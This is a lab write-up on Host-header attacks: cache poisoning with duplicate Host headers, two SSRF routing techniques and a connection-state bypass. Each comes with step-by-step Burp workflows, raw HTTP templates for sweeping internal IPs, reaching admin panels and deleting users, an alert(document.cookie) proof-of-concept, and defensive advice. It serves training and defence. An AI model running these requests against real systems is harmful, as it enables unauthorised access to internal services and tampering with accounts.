## Encounters

# Web cache poisoning via ambiguous requests

Risk: Discrepancies between the caching layer and the origin server when handling ambiguous requests (for example, multiple `Host` headers) enable cache poisoning. An attacker can cause the cache to store a response that references an attacker-controlled absolute URL (for a script), so subsequent victims load and execute attacker-supplied JavaScript.

Assumptions
- A shared cache/CDN sits in front of the origin and caches the home page (`GET /`).
- The origin reflects an absolute URL based on a header value (for example, a second `Host` header) into a script tag, such as `/resources/js/tracking.js`.
- The cache keys and/or request normalization differ from the origin’s validation (cache ignores the second `Host` header while the origin uses it to build content), producing a cache/origin mismatch.
- A victim periodically visits the home page.

High-level attack chain
1) Confirm caching of the home page and identify a cache-buster query parameter to force revalidation (for example, `?cb=123`).
2) Discover an ambiguity vector the origin uses but the cache ignores (for example, a duplicate `Host` header). Ensure the reflected value appears in an absolute URL in the HTML response.
3) Host a malicious script at the reflected absolute URL path on your exploit server (for example, `/resources/js/tracking.js`).
4) Send an ambiguous request to poison the cache so that the cached home page references your exploit server’s script.
5) Verify a cache hit serves the poisoned page and that the victim’s browser executes `alert(document.cookie)`.

Hunting methodology (repeatable)
1) Establish caching behavior
   - Request `GET /` while proxying and note cache headers (age, hit/miss, TTL). Introduce a cache buster like `GET /?cb=123` to force a fresh response when needed.

2) Probe for ambiguity that affects content but not cache key
   - Duplicate `Host` header: keep the first `Host` valid, add a second `Host` with an arbitrary value. Observe whether this value appears in an absolute URL in the response (for example, a script import).
   - Remove the second `Host` header and replay using the same cache-buster. If the injected value persists, the response was cached using a key that ignored the ambiguous header.

3) Prepare exploit content
   - On your exploit server, create `/resources/js/tracking.js` with a simple PoC payload:
```
alert(document.cookie)
```

4) Poison the cache
   - With cache buster: send the ambiguous request several times until you get a cache hit that includes your exploit server’s absolute URL in the response.
   - To affect the default home page (no cache buster), repeat poisoning requests without `?cb` until the default variant is cached with your malicious reference.

5) Validate victim impact
   - Load the home page as a victim (or in a clean browser) and verify `alert(document.cookie)` executes, indicating successful poisoning.

Key request example (duplicate Host headers)
```
GET /?cb=123 HTTP/1.1
Host: {VICTIMSITE}
Host: {EXPLOIT_HOST}
```

Notes and pitfalls
- Many caches reject malformed requests; subtle differences exist per vendor. If duplicates are blocked, try other ambiguity vectors (for example, `X-Forwarded-Host`, `Forwarded`, absolute-URL forms in `Referer`-derived logic, or header casing/duplication with hop-by-hop vs end-to-end semantics).
- Cache keys often ignore secondary headers; aim for parameters that the origin uses to build content but the cache does not vary on.
- CSP may block external script loads. If present, look for JSONP-like endpoints or inline vectors; however, this specific lab expects external script import.
- TTL and background revalidation can overwrite your payload; re-poison as needed until the victim visits.

Defensive guidance
- Strictly enforce a single, canonical `Host` header. Reject requests with multiple `Host` headers per RFC 9110.
- Normalize and consistently validate headers at both cache and origin. Ensure caches vary on all inputs that influence the response (`Vary` headers and cache key configuration).
- Never derive absolute URLs from untrusted headers (`Host`, `X-Forwarded-Host`, `Forwarded`). Build URLs from server configuration, not request headers.
- Apply a restrictive CSP (`script-src`) to prevent execution of scripts from untrusted origins.
- Prefer relative URLs for internal resources to avoid unintended absolute-URL injection.

Burp workflow (quick)
- Send `GET /` to Repeater. Add `?cb=123` to manage cache freshness.
- Add a second `Host` header and observe if its value is reflected into a script import URL.
- Remove the second `Host` and replay with the same cache buster to confirm cache poisoning.
- Host `/resources/js/tracking.js` on your exploit server with `alert(document.cookie)`.
- Duplicate the `Host` header with your exploit domain and send until you get a cache hit. Validate in a browser, then repeat without cache buster to poison the default page.

# Routing-based SSRF via Host header

Risk: The application or upstream reverse proxy uses the request `Host` header for internal routing. By supplying an internal IP in `Host`, you can reach private services (for example, an intranet admin panel at `192.168.0.0/24`) and perform privileged actions.

Assumptions
- Middleware/proxy routes based on `Host` and will attempt to connect to that authority.
- Internal admin panel is reachable at `192.168.0.0/24` and exposes `/admin` and `/admin/delete` with CSRF token and cookie-based session.
- Outbound external traffic is restricted; use the default Burp Collaborator for validation of arbitrary routing where needed.

High-level attack chain
1) Confirm SSRF primitive via `Host` by pointing it to Burp Collaborator domain and observing an interaction.
2) Bruteforce `192.168.0.0/24` in the `Host` header to discover which IP returns `302 /admin`.
3) Route requests to that internal IP to access `/admin` and extract CSRF/session.
4) Craft a POST to `/admin/delete` with the extracted CSRF and cookie to delete `carlos`.

Hunting methodology (repeatable)
1) Validate routing SSRF primitive
   - Send `GET /` that yields 200 to Repeater. Replace `Host: {VICTIMSITE}` with a Burp Collaborator domain. If interactions appear in Collaborator, the middleware is issuing outbound requests based on `Host`.

2) Bruteforce internal range via `Host`
   - In Intruder, turn off “Update Host header to match target”. Use positions: `Host: 192.168.0.§0§` with numeric payloads 0–255. Sort by status; identify the IP that yields a `302` to `/admin`.

3) Access the admin panel
   - In Repeater, set `Host: 192.168.0.{HIT}` and request `GET /admin`. Confirm access and locate CSRF token and session cookie in the response.

4) Delete the target user
   - Change request to `GET /admin/delete?csrf={TOKEN}&username=carlos` and include the session cookie from the prior response. Convert to POST (Burp: Change request method) and resend.

Key request templates
```
# Discovery (Repeater)
GET / HTTP/1.1
Host: {COLLAB_DOMAIN}

# Bruteforce (Intruder)
GET / HTTP/1.1
Host: 192.168.0.§0§

# Admin access
GET /admin HTTP/1.1
Host: 192.168.0.{HIT}

# Delete user
POST /admin/delete?csrf={TOKEN}&username=carlos HTTP/1.1
Host: 192.168.0.{HIT}
Cookie: session={SESSION}
Content-Length: 0
```

Notes and pitfalls
- Some stacks require absolute-URI forms in the request line or authority headers; if no interaction, try `GET http://192.168.0.1/ HTTP/1.1` with `Host` left as the internal IP.
- Proxies may enforce SNI/HTTPS differences; if TLS is in play, this technique typically targets HTTP upstreams. If HTTPS is required, look for `X-Forwarded-Host`/`Forwarded` influence instead.
- Ensure Burp does not auto-rewrite the `Host` header; disable “Update Host header to match target”.

Defensive guidance
- Do not route based on untrusted `Host`. Enforce a strict, canonical `Host` allowlist at the edge and terminate routing on configuration, not headers.
- Drop requests with multiple or malformed `Host` headers. Normalize and validate before any routing logic.
- Segment internal services; require auth on admin panels even from internal networks.
- Use allowlisted upstreams and service discovery instead of header-derived destinations.

# SSRF via flawed request parsing

Risk: The server validates the `Host` header for origin-form requests, but when an absolute URI is used in the request line, routing/validation is derived from the absolute URL instead. By sending an absolute-form request line while manipulating `Host`, you can coerce middleware to route to arbitrary backends (for example, internal IPs), enabling SSRF to an intranet admin panel.

Assumptions
- Server accepts absolute-URI request lines (for example, `GET https://{VICTIMSITE}/ HTTP/1.1`).
- With absolute-form requests, validation focuses on the absolute URL host and not the `Host` header; middleware still uses `Host` for upstream routing.
- Internal admin panel is reachable at `192.168.0.0/24` and exposes `/admin` and `/admin/delete` (CSRF token + cookie session).
- External verification must use Burp Collaborator’s default public server.

High-level attack chain
1) Prove absolute-form parsing difference: `GET https://{VICTIMSITE}/` works even when `Host` is changed (origin-form would be blocked) but may timeout, indicating routing attempts to the `Host` destination.
2) Verify SSRF: keep request line absolute to `{VICTIMSITE}`, set `Host: {COLLAB_DOMAIN}`, and observe Collaborator interactions.
3) Bruteforce `192.168.0.0/24` via `Host` to find the admin IP (look for `302 /admin`).
4) Access `/admin` and obtain CSRF and session cookie while routing via the discovered internal IP.
5) Send a POST to `/admin/delete` with CSRF + cookie to delete `carlos`.

Hunting methodology (repeatable)
1) Baseline and absolute-form test
   - Origin-form baseline: `GET /` with `Host: {VICTIMSITE}` → 200.
   - Absolute-form: `GET https://{VICTIMSITE}/` with modified `Host` → request not blocked; timeouts indicate routing attempt to `Host` destination.

2) Validate SSRF with Collaborator
   - `GET https://{VICTIMSITE}/` and `Host: {COLLAB_DOMAIN}` → poll Collaborator for HTTP interactions.

3) Sweep internal range via `Host`
   - Intruder: deselect “Update Host header to match target”. Use `Host: 192.168.0.§0§` with Numbers 0–255. Sort by status; identify the `302` to `/admin`.

4) Access admin and delete user
   - Repeater: `GET https://{VICTIMSITE}/admin` with `Host: 192.168.0.{HIT}` to get CSRF + `Set-Cookie`.
   - Then: `POST https://{VICTIMSITE}/admin/delete?csrf={TOKEN}&username=carlos` with `Host: 192.168.0.{HIT}` and `Cookie: session={SESSION}`.

Key request templates
```
# Absolute-form baseline
GET https://{VICTIMSITE}/ HTTP/1.1
Host: {VICTIMSITE}

# SSRF validation
GET https://{VICTIMSITE}/ HTTP/1.1
Host: {COLLAB_DOMAIN}

# Bruteforce internal range
GET https://{VICTIMSITE}/ HTTP/1.1
Host: 192.168.0.§0§

# Admin access
GET https://{VICTIMSITE}/admin HTTP/1.1
Host: 192.168.0.{HIT}

# Delete user (convert to POST)
POST https://{VICTIMSITE}/admin/delete?csrf={TOKEN}&username=carlos HTTP/1.1
Host: 192.168.0.{HIT}
Cookie: session={SESSION}
Content-Length: 0
```

Notes and pitfalls
- Disable “Update Host header to match target” in Burp to prevent automatic rewrites.
- Some stacks only accept absolute-form for proxy behavior; if `https://` times out, try `http://` in the absolute form.
- If responses set a new session cookie on `/admin`, include it in the subsequent delete request.
- Timing differences during the sweep can distinguish live/internal hosts from dead ones.

Burp workflow (quick)
- Send `GET https://{VICTIMSITE}/` to Repeater; verify modified `Host` isn’t blocked but may change behavior.
- Replace `Host` with `{COLLAB_DOMAIN}` and poll for interactions.
- Send to Intruder; sweep `Host: 192.168.0.§0§` with 0–255.
- In Repeater, use `Host: 192.168.0.{HIT}` with `GET https://{VICTIMSITE}/admin` → copy CSRF + cookie.
- Convert to POST: `POST https://{VICTIMSITE}/admin/delete?csrf={TOKEN}&username=carlos` with `Cookie: session={SESSION}`.

Defensive guidance
- Validate and route based on a canonical, trusted authority; do not derive from absolute request line nor untrusted `Host`.
- Normalize requests to origin-form at the edge before validation and routing.
- Enforce strict allowlists for upstream destinations; segment and authenticate internal admin panels.

# Host validation bypass via connection state attack

Risk: The frontend performs `Host` validation only on the first request of a TCP connection, then assumes subsequent requests on the same connection share the same trusted context. By priming the connection with a benign request, you can send a second request on the same connection that targets an internal service (for example, `192.168.0.1/admin`).

Assumptions
- Frontend keeps connections alive and reuses the same connection for sequential requests (HTTP/1.1 keep-alive).
- Validation decisions are cached per-connection after the first request.
- Internal admin at `192.168.0.1/admin` is reachable through internal routing once the connection is considered trusted.

High-level attack chain
1) Direct `GET /admin` with `Host: 192.168.0.1` is rejected or redirected.
2) Open a connection and send a benign request first (valid `Host` and `/`).
3) Reuse the same connection to send `GET /admin` with `Host: 192.168.0.1`; the frontend routes it internally based on the primed state.
4) Extract CSRF and cookies; then submit a POST to `/admin/delete` to delete `carlos`.

Burp workflow (grouped single connection)
1) Tab A (malicious):
```
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```
2) Tab B (primer):
```
GET / HTTP/1.1
Host: {VICTIMSITE}
Connection: keep-alive
```
3) Add both tabs to a group → Send group in sequence (single connection). Ensure keep-alive is set. Observe Tab A initially fails alone but succeeds when preceded by Tab B on the same connection.

Delete request template (second request on the same connection)
```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab={LAB_COOKIE}; session={SESSION}
Content-Type: application/x-www-form-urlencoded
Content-Length: {LEN}

csrf={TOKEN}&username=carlos
```

Notes and pitfalls
- The order matters: prime with a valid `Host` first, then target the internal host on the same connection.
- Use Burp Repeater’s “Send group in sequence (single connection)” and do not change connection settings between sends.
- Ensure `Content-Length` is exact; mismatches will break connection reuse. Avoid proxies that coalesce or split connections.
- If the first request contains `Connection: close`, the server will not reuse the connection; use `keep-alive`.

Defensive guidance
- Validate `Host` and routing per-request, not per-connection. Do not cache trust decisions on connection state.
- Disable or strictly manage keep-alive between untrusted clients and frontends if validation cannot be enforced uniformly.
- Terminate untrusted connections at a gateway that normalizes and revalidates every request.
